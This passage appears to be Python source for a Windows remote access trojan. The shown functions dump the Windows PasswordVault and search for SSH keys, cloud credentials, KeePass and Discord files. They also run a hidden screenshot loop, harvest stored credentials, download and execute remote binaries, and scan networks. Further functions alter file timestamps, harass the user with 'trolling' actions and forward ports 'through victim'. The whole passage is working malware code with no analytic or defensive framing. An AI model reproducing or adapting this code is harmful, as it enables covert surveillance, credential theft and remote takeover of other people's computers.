        $all | ForEach-Object { try{$_.RetrievePassword()}catch{}
            "  Res=$($_.Resource) | User=$($_.UserName) | Pass=$($_.Password)" }
    } else { "  (vault empty)" }
} catch { "  WinRT PasswordVault unavailable" }'''
    results.append("\n=== Windows PasswordVault ===")
    results.append(run_ps(ps, timeout=10))
    return "\n".join(results)

def net_scan(subnet: str = "") -> str:
    """Ping sweep of a /24 subnet."""
    subnet = subnet.strip()
    if '/' in subnet:
        subnet = '.'.join(subnet.split('/')[0].split('.')[:3])
    elif subnet.count('.') == 3:
        subnet = '.'.join(subnet.split('.')[:3])
    if not subnet:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
            subnet = '.'.join(ip.split('.')[:3])
        except:
            return "[-] Could not determine local subnet"
    ps = f'''$sub = "{subnet}"
$jobs = 1..254 | ForEach-Object {{
    $ip = "$sub.$_"
    Start-Job -ScriptBlock {{
        param($h)
        if (Test-Connection -ComputerName $h -Count 1 -Quiet -TimeoutSeconds 1) {{
            try {{ $n=[System.Net.Dns]::GetHostEntry($h).HostName; "$h  [$n]" }} catch {{ "$h" }}
        }}
    }} -ArgumentList $ip
}}
$jobs | Wait-Job -Timeout 30 | Out-Null
$r = $jobs | Receive-Job | Sort-Object
$jobs | Remove-Job -Force | Out-Null
$r'''
    out = run_ps(ps, timeout=90)
    lines = [l.strip() for l in out.split('\n') if l.strip() and '.' in l and not l.startswith('[')]
    if not lines:
        return f"[-] No live hosts in {subnet}.0/24"
    return f"[+] Live hosts in {subnet}.0/24 ({len(lines)}):\n" + "\n".join(lines)

def hosts_edit(domain: str, ip: str) -> str:
    """Add an entry to the hosts file."""
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts_path, 'r') as f:
            content = f.read()
        if domain in content:
            return f"[~] '{domain}' already exists in hosts"
        with open(hosts_path, 'a') as f:
            f.write(f"\n{ip}\t{domain}")
        return f"[+] hosts: {ip} → {domain}"
    except PermissionError:
        return "[-] Permission denied to edit hosts"
    except Exception as e:
        return f"[-] Error: {e}"

def getenv(var: str = "") -> str:
    """Show environment variables."""
    if var:
        val = os.environ.get(var)
        return f"[+] {var}={val}" if val is not None else f"[-] '{var}' not found"
    return "[+] Environment Variables:\n" + "\n".join(sorted(f"  {k}={v}" for k, v in os.environ.items()))

def download_dir(path: str) -> str:
    """Compress a directory and return ZIP path."""
    path = path.strip().strip('"\'')
    if not os.path.isdir(path):
        return f"[-] Not a directory: {path}"
    dname = os.path.basename(path.rstrip('/\\')) or "dir"
    zpath = os.path.join(TEMP, f"dir_{dname}_{datetime.datetime.now().strftime('%H%M%S')}.zip")
    total = 0
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(path):
                for file in files:
                    full = os.path.join(root, file)
                    try:
                        fsize = os.path.getsize(full)
                        if fsize > 100 * 1024 * 1024 or total > 500 * 1024 * 1024:
                            continue
                        zf.write(full, os.path.relpath(full, path))
                        total += fsize
                    except:
                        continue
        return zpath
    except Exception as e:
        return f"[-] ZIP error: {e}"

def clip_set(text: str) -> str:
    """Set clipboard content."""
    try:
        env = os.environ.copy()
        env['_CLIP_TEXT'] = text
        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command',
                        'Set-Clipboard -Value $env:_CLIP_TEXT'],
                       capture_output=True, creationflags=0x08000000, env=env, timeout=5)
        preview = text[:80] + ('...' if len(text) > 80 else '')
        return f"[+] Clipboard → '{preview}'"
    except Exception as e:
        return f"[-] Error: {e}"

_scrloop_active = False
_scrloop_dir = os.path.join(TEMP, "scrloop")

def scrloop_control(action: str, interval: str = "5") -> str:
    """Control periodic screenshot capture."""
    global _scrloop_active
    if action == "start":
        if _scrloop_active:
            return "[*] Already active"
        try:
            iv = max(1, int(interval))
        except:
            iv = 5
        os.makedirs(_scrloop_dir, exist_ok=True)
        ps_script = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $i=1
while($true){{
    $bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height)
    $g=[System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
    $ts=Get-Date -Format "HHmmss"
    $bmp.Save("{_scrloop_dir}\\sc_${{ts}}_${{i}}.jpg",[System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose();$bmp.Dispose();$i++
    Start-Sleep -Seconds {iv}
}}'''
        ps_path = os.path.join(TEMP, "sl.ps1")
        try:
            with open(ps_path, 'w') as f:
                f.write(ps_script)
            subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', ps_path],
                             creationflags=0x08000000)
            _scrloop_active = True
            return f"[+] Screenshot loop started (every {iv}s)"
        except Exception as e:
            return f"[-] Error: {e}"
    elif action == "stop":
        run_ps('''Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" | Where-Object {$_.CommandLine -like '*sl.ps1*'} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}''')
        _scrloop_active = False
        safe_remove(os.path.join(TEMP, "sl.ps1"))
        return "[+] Screenshot loop stopped"
    elif action == "dump":
        frames = sorted(glob.glob(os.path.join(_scrloop_dir, "*.jpg")))
        if not frames:
            return "[-] No captures yet"
        zpath = os.path.join(TEMP, "scrloop.zip")
        try:
            with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in frames:
                    zf.write(f, os.path.basename(f))
            for f in frames:
                safe_remove(f)
            return zpath
        except Exception as e:
            return f"[-] Error: {e}"
    elif action == "clear":
        safe_remove(_scrloop_dir)
        os.makedirs(_scrloop_dir, exist_ok=True)
        return "[+] Captures deleted"
    return "[-] Usage: scrloop <start [sec]|stop|dump|clear>"

def proc_list() -> str:
    """List running processes in a formatted table."""
    r = run_cmd('tasklist /v /fo csv /nh', timeout=20)
    header = f"{'PID':<7} {'Name':<28} {'Mem(KB)':<11} {'User'}"
    rows = [header, "─" * 65]
    for l in r.split('\n'):
        try:
            p = [x.strip('"') for x in l.strip().split('","')]
            if len(p) >= 5 and p[1].isdigit():
                rows.append(f"{p[1]:<7} {p[0][:27]:<28} {p[4][:10].replace(' K',''):<11} {p[6][:25] if len(p)>6 else 'N/A'}")
        except:
            continue
    return "[+] Processes:\n" + "\n".join(rows[:80])

def cat_file(path: str) -> str:
    """Read and return the contents of a text file."""
    path = path.strip().strip('"\'')
    if not os.path.isfile(path):
        return f"[-] Does not exist: {path}"
    try:
        size = os.path.getsize(path)
        if size > 5 * 1024 * 1024:
            return f"[-] Too large ({size//1024}KB). Use: download {path}"
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read(200000)
        trunc = len(content) == 200000
        return f"[+] {path} ({size}B):\n{'─'*40}\n{content}" + ("\n[...truncated...]" if trunc else "")
    except Exception as e:
        return f"[-] Error: {e}"

def find_secrets() -> str:
    """Search for common sensitive files."""
    results = []
    targets = {
        "SSH Keys": [os.path.join(USER_PROFILE, ".ssh", f) for f in ["id_rsa", "id_ed25519", "id_ecdsa", "authorized_keys"]],
        "AWS Creds": [os.path.join(USER_PROFILE, ".aws", f) for f in ["credentials", "config"]],
        "Git Config": [os.path.join(USER_PROFILE, ".gitconfig")],
        "FileZilla": [os.path.join(APPDATA, "FileZilla", "recentservers.xml"),
                      os.path.join(APPDATA, "FileZilla", "sitemanager.xml")],
        "WinSCP": [os.path.join(APPDATA, "WinSCP.ini")],
        "MobaXterm": [os.path.join(APPDATA, "MobaXterm", "MobaXterm.ini")],
        "KeePass": glob.glob(os.path.join(USER_PROFILE, "**", "*.kdbx"), recursive=True)[:3],
        "VPN": glob.glob(os.path.join(USER_PROFILE, "**", "*.ovpn"), recursive=True)[:5],
        ".env": glob.glob(os.path.join(USER_PROFILE, "**", ".env"), recursive=True)[:5],
        "Docker": [os.path.join(USER_PROFILE, ".docker", "config.json")],
        "Azure": [os.path.join(USER_PROFILE, ".azure", "accessTokens.json")],
        "GCloud": [os.path.join(APPDATA, "gcloud", "credentials.db")],
        "Discord": [os.path.join(APPDATA, "discord", "Local Storage", "leveldb")],
    }
    for cat, paths in targets.items():
        found = [p for p in paths if os.path.isfile(str(p))]
        if found:
            results.append(f"\n  [!] {cat}:")
            for p in found:
                results.append(f"       {p}")
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions", 0, winreg.KEY_READ)
        sessions, i = [], 0
        while True:
            try:
                sessions.append(winreg.EnumKey(key, i))
                i += 1
            except:
                break
        winreg.CloseKey(key)
        if sessions:
            results.append(f"\n  [!] PuTTY Sessions: {', '.join(sessions)}")
    except:
        pass
    for base in [os.path.join(USER_PROFILE, "Desktop"), os.path.join(USER_PROFILE, "Downloads")]:
        if os.path.exists(base):
            for f in os.listdir(base):
                if any(kw in f.lower() for kw in ['pass', 'cred', 'secret', 'token', 'key', 'api', 'login', 'cuenta', 'contraseña']) and \
                   any(f.endswith(e) for e in ['.txt', '.xml', '.ini', '.json', '.yml', '.csv', '.xlsx', '.docx']):
                    results.append(f"\n  [!] File: {os.path.join(base, f)}")
    if not results:
        return "[-] No obvious secrets found"
    return "[+] Secrets / interesting files:" + "".join(results)

# ===================== NEW v3.0 COMMANDS (non-admin) =====================

def port_scan(target: str, ports: str = "") -> str:
    """Simple TCP port scanner."""
    target = target.strip()
    if not ports:
        port_list = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
    else:
        port_list = []
        for part in ports.split(','):
            part = part.strip()
            if '-' in part:
                try:
                    a, b = part.split('-')
                    port_list.extend(range(int(a), int(b) + 1))
                except:
                    pass
            else:
                try:
                    port_list.append(int(part))
                except:
                    pass
    if not port_list:
        return "[-] Invalid ports"
    results = [f"[*] Scanning {target} ({len(port_list)} ports)..."]
    open_ports = []
    for port in port_list:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                open_ports.append(f"  {port}/tcp  OPEN  ({service})")
            s.close()
        except:
            pass
    if open_ports:
        results.append(f"[+] {len(open_ports)} open port(s):")
        results.extend(open_ports)
    else:
        results.append("[-] No open ports found")
    return "\n".join(results)

def dns_lookup(name: str) -> str:
    """DNS lookup (forward, reverse, MX)."""
    name = name.strip()
    results = [f"[*] DNS Lookup: {name}"]
    try:
        ips = socket.getaddrinfo(name, None)
        seen = set()
        for info in ips:
            ip = info[4][0]
            if ip not in seen:
                results.append(f"  {ip}  ({info[0].name})")
                seen.add(ip)
    except Exception as e:
        results.append(f"[-] Error: {e}")
    try:
        ip = socket.gethostbyname(name)
        rev = socket.gethostbyaddr(ip)
        results.append(f"  Reverse: {rev[0]}")
    except:
        pass
    ns = run_cmd(f'nslookup -type=MX {name} 2>nul', timeout=10)
    if 'mail exchanger' in ns.lower():
        results.append("\n  MX Records:")
        for l in ns.split('\n'):
            if 'mail exchanger' in l.lower():
                results.append(f"    {l.strip()}")
    return "\n".join(results)

def traceroute(target: str) -> str:
    """Run tracert to target."""
    return f"[*] Traceroute to {target}:\n" + run_cmd(f'tracert -d -w 500 -h 20 {target}', timeout=60)

def arp_table() -> str:
    """Show ARP table."""
    return "[+] ARP Table:\n" + run_cmd('arp -a', timeout=10)

def disk_info() -> str:
    """Show disk information."""
    ps = '''Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, @{N='FreeGB';E={[math]::Round($_.FreeSpace/1GB,2)}}, @{N='Used%';E={if($_.Size -gt 0){[math]::Round(($_.Size-$_.FreeSpace)/$_.Size*100,1)}else{'N/A'}}}, FileSystem, VolumeName | FT -Auto | Out-String -Width 200'''
    return "[+] Disks:\n" + run_ps(ps, timeout=15)

def get_uptime() -> str:
    """Return uptime string."""
    return f"[+] Uptime: {get_uptime_str()}"

def logoff_user() -> str:
    """Log off current user."""
    r = run_cmd("shutdown /l /f", timeout=5)
    return "[+] Session logged off" if '[-]' not in r else r

def open_url(url: str) -> str:
    """Open a URL in the default browser."""
    url = url.strip()
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        os.startfile(url)
        return f"[+] URL opened: {url}"
    except Exception as e:
        return f"[-] Error: {e}"

def type_text(text: str) -> str:
    """Simulate keyboard typing."""
    ps = f'''Add-Type -AssemblyName System.Windows.Forms
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("{text.replace('{','{{').replace('}','}}').replace('+','{+}').replace('^','{^}').replace('%','{%}')}")'''
    run_ps(ps, timeout=10)
    return f"[+] Text typed ({len(text)} characters)"

def msgbox(title: str, text: str, icon: str = "info") -> str:
    """Show a custom message box."""
    icons = {"info": "Information", "warn": "Warning", "error": "Error", "question": "Question"}
    env = os.environ.copy()
    env['_MB_TITLE'] = title
    env['_MB_TEXT'] = text
    ps = f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($env:_MB_TEXT, $env:_MB_TITLE, "OK", "{icons.get(icon, "Information")}") | Out-Null'
    try:
        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', ps],
                       timeout=30, capture_output=True, creationflags=0x08000000, env=env)
        return f"[+] Message displayed: [{title}]"
    except:
        return "[-] Error displaying message"

def tts_speak(text: str) -> str:
    """Speak text using SAPI."""
    vbs_path = os.path.join(TEMP, f"tts_{datetime.datetime.now().strftime('%H%M%S')}.vbs")
    try:
        with open(vbs_path, 'w') as f:
            f.write(f'CreateObject("SAPI.SpVoice").Speak "{text.replace(chr(34), chr(34)+chr(34))}"')
        subprocess.Popen(['wscript', vbs_path], creationflags=0x08000000)
        return f"[+] Speaking: '{text[:60]}...'" if len(text) > 60 else f"[+] Speaking: '{text}'"
    except Exception as e:
        return f"[-] TTS error: {e}"

def startup_list() -> str:
    """List startup programs."""
    r = ["=== Startup Programs ===\n"]
    for hive_name, hive in [("HKCU", winreg.HKEY_CURRENT_USER), ("HKLM", winreg.HKEY_LOCAL_MACHINE)]:
        r.append(f"\n[{hive_name}\\...\\Run]:")
        try:
            key = winreg.OpenKey(hive, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
            i = 0
            while True:
                try:
                    name, val, _ = winreg.EnumValue(key, i)
                    r.append(f"  {name}: {val}")
                    i += 1
                except:
                    break
            winreg.CloseKey(key)
        except:
            r.append("  (access denied)")
    startup = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if os.path.exists(startup):
        r.append("\n[Startup Folder]:")
        for f in os.listdir(startup):
            r.append(f"  {f}")
    r.append("\n[Active Scheduled Tasks]:")
    r.append(run_ps("Get-ScheduledTask | Where {$_.State -eq 'Ready'} | Select -First 20 TaskName,TaskPath | FT -Auto | Out-String -Width 200", timeout=20))
    return "\n".join(r)

def list_shares() -> str:
    """List shared resources."""
    return "[+] Shared resources:\n" + run_cmd('net share', timeout=10)

def token_steal() -> str:
    """Dump identity and token information."""
    r = ["=== Tokens and Identity ==="]
    r.append(run_cmd("whoami /all"))
    r.append("\n=== Stored Credentials ===")
    r.append(run_cmd("cmdkey /list"))
    r.append("\n=== Active Sessions ===")
    r.append(run_cmd("query session 2>nul"))
    r.append("\n=== Connected Users ===")
    r.append(run_cmd("query user 2>nul"))
    return "\n".join(r)

def ssh_keys() -> str:
    """List and display SSH keys."""
    ssh_dir = os.path.join(USER_PROFILE, ".ssh")
    if not os.path.exists(ssh_dir):
        return "[-] .ssh directory does not exist"
    results = [f"[+] SSH Directory: {ssh_dir}"]
    for f in os.listdir(ssh_dir):
        fp = os.path.join(ssh_dir, f)
        if os.path.isfile(fp):
            results.append(f"  {f} ({os.path.getsize(fp)}B)")
            if f.endswith('.pub') or f in ('authorized_keys', 'known_hosts', 'config'):
                try:
                    with open(fp, 'r', errors='replace') as fh:
                        content = fh.read(2000)
                    results.append(f"    ─── content ───\n{content}\n    ───────────────")
                except:
                    pass
    return "\n".join(results)

def download_url(url: str, dest: str = "") -> str:
    """Download a file from the internet."""
    url = url.strip()
    if not dest:
        dest = os.path.join(TEMP, f"dl_{os.path.basename(url.split('?')[0])[:40] or 'file'}")
    try:
        urllib.request.urlretrieve(url, dest)
        return f"[+] Downloaded: {dest} ({os.path.getsize(dest):,} bytes)"
    except Exception as e:
        return f"[-] Download error: {e}"

def exec_remote(url: str) -> str:
    """Download a binary from URL and execute it."""
    url = url.strip()
    ext = os.path.splitext(url.split('?')[0])[1] or '.exe'
    dest = os.path.join(TEMP, f"dl_exec_{datetime.datetime.now().strftime('%H%M%S')}{ext}")
    try:
        urllib.request.urlretrieve(url, dest)
        subprocess.Popen(dest, shell=True, creationflags=0x08000000)
        return f"[+] Downloaded and executed: {dest}"
    except Exception as e:
        return f"[-] Error: {e}"

def file_info(path: str) -> str:
    """Show detailed file information and hashes."""
    path = path.strip().strip('"\'')
    if not os.path.exists(path):
        return f"[-] Does not exist: {path}"
    try:
        st = os.stat(path)
        r = [f"[+] Info for: {path}"]
        r.append(f"  Type: {'Directory' if os.path.isdir(path) else 'File'}")
        r.append(f"  Size: {st.st_size:,} bytes ({st.st_size/1024/1024:.2f} MB)")
        r.append(f"  Created: {datetime.datetime.fromtimestamp(st.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}")
        r.append(f"  Modified: {datetime.datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
        r.append(f"  Permissions: R={'✓' if os.access(path, os.R_OK) else '✗'} W={'✓' if os.access(path, os.W_OK) else '✗'} X={'✓' if os.access(path, os.X_OK) else '✗'}")
        if os.path.isfile(path):
            try:
                with open(path, 'rb') as f:
                    data = f.read(8192)
                r.append(f"  MD5: {hashlib.md5(data).hexdigest()}")
                r.append(f"  SHA256: {hashlib.sha256(data).hexdigest()}")
            except:
                pass
        return "\n".join(r)
    except Exception as e:
        return f"[-] Error: {e}"

def touch_file(path: str) -> str:
    """Create empty file or update timestamp."""
    path = path.strip().strip('"\'')
    try:
        with open(path, 'a'):
            os.utime(path, None)
        return f"[+] File touched: {path}"
    except Exception as e:
        return f"[-] Error: {e}"

def make_dir(path: str) -> str:
    """Create a directory."""
    try:
        os.makedirs(path.strip().strip('"\''), exist_ok=True)
        return f"[+] Directory created: {path}"
    except Exception as e:
        return f"[-] Error: {e}"

def remove_dir(path: str) -> str:
    """Remove a file or directory."""
    path = path.strip().strip('"\'')
    if not os.path.exists(path):
        return f"[-] Does not exist: {path}"
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        return f"[+] Removed: {path}"
    except Exception as e:
        return f"[-] Error: {e}"

def move_file(src: str, dst: str) -> str:
    """Move or rename a file/directory."""
    try:
        shutil.move(src.strip(), dst.strip())
        return f"[+] Moved: {src} → {dst}"
    except Exception as e:
        return f"[-] Error: {e}"

def copy_file(src: str, dst: str) -> str:
    """Copy a file or directory."""
    try:
        if os.path.isdir(src.strip()):
            shutil.copytree(src.strip(), dst.strip())
        else:
            shutil.copy2(src.strip(), dst.strip())
        return f"[+] Copied: {src} → {dst}"
    except Exception as e:
        return f"[-] Error: {e}"

def whoami() -> str:
    """Run whoami /all."""
    return run_cmd("whoami /all")

def hostname_cmd() -> str:
    """Show hostname and FQDN."""
    return f"[+] Hostname: {socket.gethostname()}\n    FQDN: {socket.getfqdn()}"

def netstat_cmd() -> str:
    """Show network connections."""
    return "[+] Network connections:\n" + run_cmd("netstat -ano", timeout=15)

def wipe_clipboard() -> str:
    """Erase clipboard content."""
    run_ps("Set-Clipboard -Value ''", timeout=5)
    return "[+] Clipboard wiped"

def screen_res() -> str:
    """Show screen resolution(s)."""
    ps = '''Add-Type -AssemblyName System.Windows.Forms
$s = [System.Windows.Forms.Screen]::AllScreens
$s | ForEach-Object { "$($_.DeviceName): $($_.Bounds.Width)x$($_.Bounds.Height) (Primary=$($_.Primary))" }'''
    return "[+] Screen resolution:\n" + run_ps(ps, timeout=10)

def idle_time() -> str:
    """Show user idle time."""
    ps = '''Add-Type @"
using System;
using System.Runtime.InteropServices;
public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
public class IdleCheck {
    [DllImport("user32.dll")] public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static uint GetIdleMs() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        GetLastInputInfo(ref lii);
        return (uint)Environment.TickCount - lii.dwTime;
    }
}
"@
$ms = [IdleCheck]::GetIdleMs()
$sec = [math]::Round($ms / 1000)
$min = [math]::Round($sec / 60, 1)
"Idle: $sec seconds ($min minutes)"'''
    return "[+] " + run_ps(ps, timeout=10)

def get_timezone() -> str:
    """Show system timezone."""
    return "[+] Timezone:\n" + run_ps("[System.TimeZoneInfo]::Local | Select-Object Id, DisplayName, BaseUtcOffset | FL | Out-String", timeout=5)

def recent_files() -> str:
    """List recently opened files."""
    recent = os.path.join(APPDATA, "Microsoft", "Windows", "Recent")
    if not os.path.exists(recent):
        return "[-] Recent directory not found"
    r = ["[+] Recent files (last 30):"]
    files = []
    for f in os.listdir(recent):
        try:
            files.append((os.path.getmtime(os.path.join(recent, f)), f))
        except:
            pass
    files.sort(reverse=True)
    for mt, f in files[:30]:
        r.append(f"  {datetime.datetime.fromtimestamp(mt).strftime('%Y-%m-%d %H:%M')}  {f}")
    return "\n".join(r)

def list_drivers() -> str:
    """List installed drivers."""
    return "[+] Installed drivers:\n" + run_cmd("driverquery /v /fo csv", timeout=30)

def active_connections() -> str:
    """Show established TCP connections and listening ports."""
    r = ["[+] Active connections (ESTABLISHED):"]
    r.append(run_cmd("netstat -n -p tcp | findstr ESTABLISHED", timeout=10))
    r.append("\n[+] Listening ports (LISTENING):")
    r.append(run_cmd("netstat -an -p tcp | findstr LISTENING", timeout=10))
    return "\n".join(r)

def quick_info() -> str:
    """Show a quick summary of system information."""
    r = ["═══ QUICK INFO ═══"]
    r.append(f"  User:     {getpass.getuser()}")
    r.append(f"  Host:     {socket.gethostname()}")
    r.append(f"  Admin:    {'YES' if is_admin() else 'NO'}")
    r.append(f"  PID:      {os.getpid()}")
    r.append(f"  Dir:      {os.getcwd()}")
    r.append(f"  Uptime:   {get_uptime_str()}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
        s.close()
    except:
        ip = "N/A"
    r.append(f"  LAN IP:   {ip}")
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as resp:
            r.append(f"  WAN IP:   {resp.read().decode()}")
    except:
        r.append("  WAN IP:   N/A")
    r.append(f"  OS:       {run_cmd('ver', timeout=5)}")
    av = run_ps("Get-MpComputerStatus -EA SilentlyContinue | Select RealTimeProtectionEnabled | FL | Out-String", timeout=10)
    if 'True' in av:
        r.append("  Defender: ACTIVE ⚠️")
    elif 'False' in av:
        r.append("  Defender: INACTIVE ✓")
    else:
        r.append("  Defender: Unknown")
    return "\n".join(r)

def grep_files(pattern: str, path: str = ".") -> str:
    """Search for text inside files."""
    pattern = pattern.strip()
    path = path.strip().strip('"\'')
    if os.path.isfile(path):
        try:
            with open(path, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
            results = [f"  {i}: {line.rstrip()}" for i, line in enumerate(lines, 1) if pattern.lower() in line.lower()]
            if results:
                return f"[+] {len(results)} match(es) in {path}:\n" + "\n".join(results[:50])
            return f"[-] No matches in {path}"
        except Exception as e:
            return f"[-] Error: {e}"
    else:
        r = run_cmd(f'findstr /s /i /n "{pattern}" "{path}\\*" 2>nul', timeout=30)
        lines = [l.strip() for l in r.split('\n') if l.strip() and not l.startswith('[-]')]
        if lines:
            return f"[+] {len(lines)} result(s):\n" + "\n".join(lines[:50])
        return f"[-] No matches for '{pattern}'"

def reg_query(path: str) -> str:
    """Query the Windows registry."""
    return "[+] Registry:\n" + run_cmd(f'reg query "{path.strip()}" 2>nul', timeout=10)

def net_user_detail(username: str = "") -> str:
    """List local users or details of a specific user."""
    if username:
        return run_cmd(f'net user "{username.strip()}"')
    return run_cmd('net user')

def net_localgroup(group: str = "") -> str:
    """List local groups or members of a specific group."""
    if group:
        return run_cmd(f'net localgroup "{group.strip()}"')
    return run_cmd('net localgroup')

def tail_file(path: str, lines: int = 20) -> str:
    """Show last N lines of a file."""
    path = path.strip().strip('"\'')
    try:
        n = int(lines)
    except:
        n = 20
    if not os.path.isfile(path):
        return f"[-] Does not exist: {path}"
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            all_lines = f.readlines()
        return f"[+] Last {n} lines of {path}:\n{'─'*40}\n{''.join(all_lines[-n:])}"
    except Exception as e:
        return f"[-] Error: {e}"

def head_file(path: str, lines: int = 20) -> str:
    """Show first N lines of a file."""
    path = path.strip().strip('"\'')
    try:
        n = int(lines)
    except:
        n = 20
    if not os.path.isfile(path):
        return f"[-] Does not exist: {path}"
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            head = [next(f) for _ in range(n)]
        return f"[+] First {n} lines of {path}:\n{'─'*40}\n{''.join(head)}"
    except StopIteration:
        return f"[+] File has fewer than {n} lines:\n{'─'*40}\n{''.join(head)}"
    except Exception as e:
        return f"[-] Error: {e}"

def write_file(path: str, content: str) -> str:
    """Write content to a file (overwrites)."""
    try:
        with open(path.strip().strip('"\''), 'w', encoding='utf-8') as f:
            f.write(content)
        return f"[+] Written: {path} ({len(content)} chars)"
    except Exception as e:
        return f"[-] Error: {e}"

def append_file(path: str, content: str) -> str:
    """Append a line to a file."""
    try:
        with open(path.strip().strip('"\''), 'a', encoding='utf-8') as f:
            f.write(content + "\n")
        return f"[+] Appended to: {path}"
    except Exception as e:
        return f"[-] Error: {e}"

def tree_dir(path: str = ".", depth: int = 3) -> str:
    """Display directory tree."""
    path = os.path.abspath(path.strip().strip('"\''))
    if not os.path.isdir(path):
        return f"[-] Not a directory: {path}"
    lines = [f"[+] Tree: {path}"]
    count = [0]

    def _tree(p, prefix, d):
        if d <= 0 or count[0] > 200:
            return
        try:
            entries = sorted(os.listdir(p))
        except:
            return
        for i, e in enumerate(entries):
            count[0] += 1
            if count[0] > 200:
                lines.append(f"{prefix}  [...more files...]")
                return
            full = os.path.join(p, e)
            connector = "└── " if i == len(entries) - 1 else "├── "
            if os.path.isdir(full):
                lines.append(f"{prefix}{connector}📁 {e}/")
                ext = "    " if i == len(entries) - 1 else "│   "
                _tree(full, prefix + ext, d - 1)
            else:
                lines.append(f"{prefix}{connector}{e}")

    _tree(path, "", depth)
    return "\n".join(lines)

def change_timestamp(path: str, timestamp: str = "") -> str:
    """Change file timestamps."""
    path = path.strip().strip('"\'')
    if not os.path.exists(path):
        return f"[-] Does not exist: {path}"
    try:
        if timestamp:
            ts = datetime.datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S").timestamp()
        else:
            ts = datetime.datetime(2020, 1, 1).timestamp()
        os.utime(path, (ts, ts))
        return f"[+] Timestamps changed: {path} → {datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')}"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== TROLLING EXTRAS =====================

def swap_mouse(enable: bool = True) -> str:
    """Swap or restore mouse buttons."""
    try:
        ctypes.windll.user32.SwapMouseButton(enable)
        return f"[+] Mouse buttons {'swapped' if enable else 'restored'}"
    except Exception as e:
        return f"[-] Error: {e}"

def hide_taskbar() -> str:
    """Hide the Windows taskbar."""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0)
        return "[+] Taskbar hidden"
    except Exception as e:
        return f"[-] Error: {e}"

def show_taskbar() -> str:
    """Show the Windows taskbar."""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 9)
        return "[+] Taskbar restored"
    except Exception as e:
        return f"[-] Error: {e}"

def crazy_cursor(seconds: int = 10) -> str:
    """Move cursor randomly for N seconds."""
    def _shake():
        end = time.time() + seconds
        while time.time() < end:
            ctypes.windll.user32.SetCursorPos(
                random.randint(0, ctypes.windll.user32.GetSystemMetrics(0)),
                random.randint(0, ctypes.windll.user32.GetSystemMetrics(1))
            )
            time.sleep(0.05)
    threading.Thread(target=_shake, daemon=True).start()
    return f"[+] Crazy cursor active for {seconds}s"

def open_cd() -> str:
    """Open CD/DVD tray."""
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        return "[+] CD tray opened"
    except Exception as e:
        return f"[-] Error: {e}"

def close_cd() -> str:
    """Close CD/DVD tray."""
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
        return "[+] CD tray closed"
    except Exception as e:
        return f"[-] Error: {e}"

def wallpaper_url(url: str) -> str:
    """Download image from URL and set as wallpaper."""
    try:
        dest = os.path.join(TEMP, "wp_" + os.path.basename(url)[:30])
        urllib.request.urlretrieve(url, dest)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, dest, 3)
        return "[+] Wallpaper changed from URL"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== PORT FORWARDING =====================

_port_fwd_threads = {}

def start_port_forward(local_port: str, remote_host: str, remote_port: str) -> str:
    """Simple TCP port forwarder through victim."""
    key = str(local_port)
